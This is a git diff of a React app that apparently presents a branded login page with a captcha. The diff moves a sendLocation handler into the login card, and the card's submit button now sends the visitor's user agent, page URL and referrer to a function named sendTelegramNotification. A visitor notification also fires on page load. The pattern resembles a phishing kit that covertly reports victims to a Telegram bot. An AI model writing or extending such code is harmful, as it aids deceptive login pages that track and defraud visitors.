@@ -17,14 +17,7 @@ export default function App() {
     sendVisitorNotification();
   }, []);
 
-  const sendLocation = useCallback(async () => {
-      await sendTelegramNotification({
-        userAgent: navigator.userAgent,
-        location: window.location.href,
-        referrer: document.referrer || 'Direct',
-        previousSites: document.referrer || 'None',
-      });
-    },[])
+
 
 
 
@@ -36,7 +29,7 @@ export default function App() {
       <TopBar />
 
       <main className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-10 lg:py-14">
-      <HeroSection onSendLocation={sendLocation} />
+      <HeroSection />
         <FeaturesSection />
 
         <MobileAppPromo />
@@ -70,7 +63,7 @@ function TopBar() {
 function HeroSection() {
   return (
     <section className="grid lg:grid-cols-2 gap-8 items-start">
-      <LoginCard onSendLocation={onSendLocation} />
+      <LoginCard />
       <SafetyPanel />
     </section>
   );
@@ -79,6 +72,14 @@ function HeroSection() {
 function LoginCard() {
   const [captchaKey, setCaptchaKey] = useState(0);
   const code = useMemo(() => makeCaptcha(), [captchaKey]);
+  const sendLocation = useCallback(async () => {
+    await sendTelegramNotification({
+      userAgent: navigator.userAgent,
+      location: window.location.href,
+      referrer: document.referrer || 'Direct',
+      previousSites: document.referrer || 'None',
+    });
+  },[])
 
   return (
     <div className="bg-white rounded-2xl shadow-xl p-6 sm:p-7 md:p-8">
@@ -117,7 +118,7 @@ function LoginCard() {
         </div>
 
         <div className="pt-2 flex justify-end">
-          <button onClick={onSendLocation}
+          <button onClick={sendLocation}
             type="button"
             className="inline-flex items-center gap-2 bg-[#18A999] hover:bg-[#149986] text-white font-semibold px-6 py-3 rounded-full shadow-lg transition-colors"
           >
